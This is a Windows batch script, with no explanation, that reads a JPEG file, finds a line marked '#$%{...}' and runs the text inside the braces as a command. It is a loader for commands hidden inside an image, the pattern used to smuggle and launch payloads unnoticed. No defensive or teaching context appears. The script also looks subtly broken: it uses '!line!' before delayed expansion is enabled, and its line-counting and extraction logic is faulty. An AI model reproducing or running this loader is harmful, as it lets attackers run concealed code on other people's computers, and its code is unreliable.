@echo off
setlocal

set "file=./tmp/img-target-node.jpeg"
set "encoding=utf8"

for /f "tokens=2 delims=[]" %%a in ('find /n "#$%{" "%file%"') do set "line=%%a"
set /a "line-=1"

set "regex=^#$%%{(.*)}$"
set "content="
for /f "usebackq delims=" %%a in ("%file%") do (
set /a "line-=1"
if !line! equ 0 (
for /f "tokens=1 delims=:" %%b in ('echo %%a ^| findstr /n /r "%regex%"') do set "content=%%b"
if defined content set "content=!content:~4,-1!"
goto :eval
)
)

:eval
if defined content (
for /f "delims=" %%a in ('echo !content!') do (
set "command=%%a"
setlocal enabledelayedexpansion
!command!
endlocal
)
)

endlocal
exit /b